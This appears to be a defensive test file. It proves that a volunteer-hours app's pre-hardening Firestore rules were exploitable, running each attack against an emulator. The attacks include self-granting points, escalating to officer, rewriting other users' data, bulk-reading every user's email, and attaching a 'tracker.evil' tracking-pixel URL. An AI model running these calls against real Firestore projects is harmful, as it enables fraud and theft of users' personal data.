import { readFileSync } from 'node:fs'
import { resolve } from 'node:path'
import {
  assertSucceeds,
  initializeTestEnvironment,
  type RulesTestEnvironment,
} from '@firebase/rules-unit-testing'
import { collection, doc, getDoc, getDocs, setDoc, updateDoc } from 'firebase/firestore'
import { afterAll, beforeAll, beforeEach, describe, expect, it } from 'vitest'

// PROOF OF EXPLOITABILITY.
// These run the same attacks that firestore.rules.test.ts asserts are DENIED, but against the rules
// as they were before hardening (rules-tests/legacy/firestore.rules.before-hardening). Every one of
// them must SUCCEED there. If one ever starts failing, this file no longer proves the attack was real
// and the matching test in firestore.rules.test.ts needs a second look.

const LEGACY = readFileSync(resolve(__dirname, 'legacy/firestore.rules.before-hardening'), 'utf8')

let env: RulesTestEnvironment
const f = (uid: string) => env.authenticatedContext(uid, { email: `${uid}@x.test` }).firestore()

const base = (uid: string, extra: Record<string, unknown> = {}) => ({
  uid, email: `${uid}@x.test`, displayName: uid, homeState: 'NJ', accountType: 'member', orgId: null,
  totalPoints: 0, totalHoursApproved: 0, currentStreakWeeks: 0, longestStreakWeeks: 0, lastServiceDate: null,
  createdAt: 1, lastActiveAt: 1, ...extra,
})
const log = (id: string, memberUid: string, orgId: string, extra: Record<string, unknown> = {}) => ({
  logId: id, memberUid, orgId, date: '2026-11-01', hours: 2, description: 'x', attachmentURLs: [],
  status: 'pending', submittedAt: 1, reviewedAt: null, reviewedByUid: null, rejectionReason: null,
  signatureURL: null, pointsAwarded: null, ...extra,
})

beforeAll(async () => {
  env = await initializeTestEnvironment({ projectId: 'demo-vetwork-legacy', firestore: { rules: LEGACY } })
})
afterAll(async () => {
  await env.cleanup()
})
beforeEach(async () => {
  await env.clearFirestore()
  await env.withSecurityRulesDisabled(async (c) => {
    const s = c.firestore()
    await setDoc(doc(s, 'users', 'victim'), base('victim'))
    await setDoc(doc(s, 'users', 'attacker'), base('attacker', { accountType: 'organization_officer' }))
    await setDoc(doc(s, 'users', 'pOfficer'), base('pOfficer', { accountType: 'organization_officer', orgId: 'orgP' }))
    await setDoc(doc(s, 'organizations', 'orgP'), { orgId: 'orgP', status: 'pending', submittedByUid: 'pOfficer' })
    await setDoc(doc(s, 'organizations', 'orgP', 'members', 'pOfficer'), { uid: 'pOfficer', status: 'approved', roleInOrg: 'officer' })
    await setDoc(doc(s, 'organizations', 'orgP', 'members', 'victim'), { uid: 'victim', status: 'approved', roleInOrg: 'member' })
    await setDoc(doc(s, 'hourLogs', 'l1'), log('l1', 'victim', 'orgP'))
    await setDoc(doc(s, 'hourLogs', 'l2'), log('l2', 'pOfficer', 'orgP'))
  })
})

describe('LEGACY rules were exploitable (each of these must succeed)', () => {
  it('any member could give themselves a million points', async () => {
    await assertSucceeds(updateDoc(doc(f('victim'), 'users', 'victim'), { totalPoints: 1_000_000, totalHoursApproved: 9999 }))
  })

  it('any new account could declare itself an officer, self-assign an orgId, then rewrite anyone’s points and goals', async () => {
    await assertSucceeds(updateDoc(doc(f('attacker'), 'users', 'attacker'), { orgId: 'anything' }))
    await assertSucceeds(updateDoc(doc(f('attacker'), 'users', 'victim'), { totalPoints: 777, totalHoursApproved: 50 }))
    await assertSucceeds(getDocs(collection(f('attacker'), 'users', 'victim', 'goals')))
  })

  it('the officer of a PENDING org could approve hours', async () => {
    await assertSucceeds(
      updateDoc(doc(f('pOfficer'), 'hourLogs', 'l1'), { status: 'approved', reviewedByUid: 'pOfficer', pointsAwarded: 99999 }),
    )
  })

  it('an officer could approve their own hours and rewrite them while approving', async () => {
    await assertSucceeds(updateDoc(doc(f('pOfficer'), 'hourLogs', 'l2'), { status: 'approved', hours: 24, reviewedByUid: 'pOfficer' }))
  })

  it('a volunteer could submit a million hours with an external tracking-pixel "photo"', async () => {
    await assertSucceeds(
      setDoc(doc(f('victim'), 'hourLogs', 'big'), log('big', 'victim', 'orgP', { hours: 1_000_000, attachmentURLs: ['https://tracker.evil/p.gif'] })),
    )
  })

  it('a user could force a friendship by being both requester and recipient', async () => {
    const [a, b] = ['attacker', 'victim'].sort()
    await assertSucceeds(
      setDoc(doc(f('attacker'), 'friendships', `${a}_${b}`), {
        participants: [a, b], requesterUid: 'attacker', recipientUid: 'attacker', status: 'pending', createdAt: 1, respondedAt: null,
      }),
    )
    await assertSucceeds(updateDoc(doc(f('attacker'), 'friendships', `${a}_${b}`), { status: 'accepted' }))
  })

  it('any signed-in user could download every user’s profile, emails included, in one query', async () => {
    const everyone = await assertSucceeds(getDocs(collection(f('attacker'), 'users')))
    expect(everyone.docs.map((d) => d.data().email)).toContain('victim@x.test')
  })

  it('any signed-in user could read another user’s email, and a pending org’s contact details', async () => {
    await assertSucceeds(getDoc(doc(f('attacker'), 'users', 'victim')))
    await assertSucceeds(getDoc(doc(f('attacker'), 'organizations', 'orgP')))
  })
})
